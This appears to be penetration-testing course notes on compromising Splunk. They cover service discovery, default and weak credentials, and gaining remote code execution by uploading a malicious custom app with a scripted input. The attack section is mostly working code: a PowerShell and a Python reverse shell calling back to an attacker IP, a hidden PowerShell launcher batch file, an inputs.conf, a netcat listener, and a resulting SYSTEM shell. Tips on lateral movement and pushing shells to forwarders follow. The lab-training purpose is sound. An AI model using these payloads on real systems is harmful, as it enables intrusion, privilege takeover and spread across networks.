Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.

Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409) and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642)

# Footprinting
Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. We may encounter Splunk externally facing at times. Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication.

Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE. The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page
![[changme.webp]]
The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.
![[splunk_login.webp]]
We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API
```bash
sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( <https://nmap.org> ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
```
# Enumeration
The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.
![[license_group.webp]]
Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications :
```bash
https://10.129.201.50:8000/en-US/app/launcher/home
```
![[splunk_home.webp]]
Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input.
These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.

# Attacking Splunk
We can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. From the Nmap discovery scan, we noticed that our target is a Windows server. Since Splunk comes with Python installed, we can create a custom Splunk application that gives us remote code execution using Python or a PowerShell script.
### Abusing Built-In Functionality
We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1).
To achieve this, we first need to create a custom Splunk application using the following directory structure :
```bash
tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```
The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner :
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present
```bash
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\\bin\\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner
```bash
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
Once the files are created, we can create a tarball or `.spl` file :
```bash
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```
The next step is to choose `Install app from file` and upload the application :
```bash
<https://10.129.201.50:8000/en-US/manager/search/apps/local>
```
![[install_app.webp]]
Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat) :
```bash
sudo nc -lnvp 443

listening on [any] 443 ...
```
On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload` :
```bash
<https://10.129.201.50:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal>
```
![[upload_app.webp]]
As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.
```bash
sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145

PS C:\\Windows\\system32> whoami

nt authority\\system

PS C:\\Windows\\system32> hostname

APP03

PS C:\\Windows\\system32>
```
In this case, we got a shell back as `NT AUTHORTY\\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain. If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app.
The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races :
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.